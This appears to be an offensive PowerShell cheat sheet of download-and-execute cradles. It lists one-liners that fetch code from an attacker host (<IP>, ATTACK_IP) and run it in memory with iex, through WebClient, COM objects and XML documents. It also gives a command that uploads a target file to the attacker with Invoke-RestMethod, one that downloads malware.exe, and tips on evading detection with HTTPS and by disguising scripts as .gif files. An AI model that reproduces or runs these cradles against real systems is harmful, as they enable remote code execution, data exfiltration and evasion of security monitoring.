# Windows PowerShell

### 1) In Memory

    Net.WebClient DownloadString Method
    Net.WebClient DownloadData Method
    Net.WebClient OpenRead Method
    .NET [Net.HttpWebReqest].class
    Word.Application COM Object
    Excel.Application COM Object
    InternetExplorer.Application COM Object
    MSXML2.ServerXmlHTTP Com Object
    Certutil.exe w/ -ping argument

### 2) On Disk

    Net.WebClient DownloadFile Method

    BITSAdmin.exe

    Cerutil.exe w/ -urlcache argument

### 3) Net.WebClient Download String Method

    powershell.exe iex (New-Object Net.Webclient).DownloadString('http://<IP>/<File>')

##### Standard download cradle

    iex (New-Object Net.Webclient).DownloadString("http://<IP>/<File>")

##### Internet Explorer Download cradle

    $ie=New-Object -ComObject
    InternetExplorer.Application;$ie.visible=$False;$ie.navigate('http://<IP>/<File>
    ');sleep 5;$response=$ie.Document.body.innerHTML;$ie.quit();iex $response

##### Requires PowerShell V3+

    iex (iwr 'http://<IP>/<File>')

    $h=New-Object -ComObject
    Msxml2.XMLHTTP;$h.open('GET','http://<IP>/<File>',$false);$h.send();iex
    $h.responseText

    $wr = [System.NET.WebRequest]::Create("http://<IP>/<File>")
    $r = $wr.GetResponse()
    IEX ([System.IO.StreamReader]($r.GetResponseStream())).ReadToEnd()

### 4) Net.WebClient Single Quotes Download and store

    iex (new-Object Net.WebClient).DownloadFile('http://<IP>/<File>', 'C:\programdata\<File>')

    powershell.exe iex (new-Object Net.WebClient).DownloadFile('http://<IP>/<File>', 'C:\programdata\<File>')

### 5) Net.WebClient User Agent Download

    $downloader = New-Object System.Net.WebClient
    $downloader.Headers.Add ("")
    $payload = "http://<IP>/<File>"
    $command = $downloader.DownloadString($payload)
    iex $command

### 6) XML Download and Execute

    $xmldoc = New-Object System.Xml.XmlDocument
    $xmldoc.Load("http://<IP>/<File.xml>")
    iex $xmldoc.command.a.execute
    $xmldoc = New-Object System.Xml.XmlDocument ; $xmldoc.Load("http://<IP>/<File.xml>") ; iex $xmldoc.command.a.execute

### XML Script example

    <?xml version="1.0"?>
    <command>
		    <a>
			    <execute>Get-Process</execute>
		    </a>
    </command>

### 7) Invoke-RestMethod

	Invoke-RestMethod -Uri http://ATTACK_IP:PORT/REMOTE_FILE -Method PUT -InFile TARGET_FILE

### 8) Invoke-WebRequest

	powershell.exe iwr -uri ATTACK_IP/malware.exe -o C:\temp\malware.exe

# TIPS AND TRICKS

### 1) If possible use SSL on attacking machine and use HTTPS to further evade detection

### 2) Further evade detection by renaming scripts from .ps1 to something else such as .gif. Powershell can still execute .gif files as Powershell files.

### 3) Multi command scripts below can be converted to one line with ';' between commands.

